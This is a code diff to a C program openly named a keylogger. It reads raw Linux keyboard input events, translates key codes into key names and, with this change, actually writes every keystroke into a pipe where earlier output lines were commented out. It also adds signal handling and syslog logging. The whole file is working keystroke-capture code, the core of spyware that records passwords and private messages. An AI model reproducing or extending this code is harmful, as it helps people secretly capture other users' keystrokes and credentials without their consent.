@@ -1,8 +1,5 @@
 #include "keylogger.h"
 
-#define BUFFER_SIZE 100
-#define NUM_KEYCODES 71
-
 const char *keycodes[] = {
         "RESERVED",
         "ESC",
@@ -79,35 +76,38 @@ const char *keycodes[] = {
 
 int loop = 1;
 
-void sigint_handler(int sig) {
+void keylogger_handler(int sig) {
     loop = 0;
+    syslog(LOG_INFO, "Keylogger stopped by signal %s", strsignal(sig));
 }
 
-void keylogger(int keyboard, int writeout) {
+void keylogger(int keyboard, int write_pipe) {
     int eventSize = sizeof(struct input_event);
-    ssize_t bytesRead = 0;
+    ssize_t bytesRead;
     struct input_event events[NUM_EVENTS];
 
     struct sigaction int_handler;
-    int_handler.sa_handler = &sigint_handler;
+    int_handler.sa_handler = &keylogger_handler;
     sigaction(SIGINT, &int_handler, NULL);
+    sigaction(SIGPIPE, &int_handler, NULL);
 
     while (loop) {
         bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);
 
         for (int i = 0; i < (bytesRead / eventSize); i++) {
-            if (events[i].type == EV_KEY) {
-                if (events[i].value == 1) {
-                    if (events[i].code > 0 && events[i].code < NUM_KEYCODES) {
-                        //afe_write_all(writeout, keycodes[events[i].code], keyboard);
-                        //safe_write_all(writeout, "\n", keyboard);
-                    } else {
-                        write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
-                    }
+            if (events[i].type == EV_KEY && events[i].value == 1) {
+                if (events[i].code > 0 && events[i].code < NUM_KEYCODES) {
+                    const char *toWrite = keycodes[events[i].code];
+                    write(write_pipe, toWrite, strlen(toWrite) + 1);
+                } else {
+                    write(write_pipe, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                 }
+                write(write_pipe, "  ", sizeof("  "));
             }
         }
     }
 
-    //if (bytesRead > 0) safe_write_all(writeout, "\n", keyboard);
+    write(write_pipe, "\n\n", sizeof("\n\n"));
+    syslog(LOG_INFO, "Keylogger finished, closing write end of pipe");
+    close(write_pipe);
 }
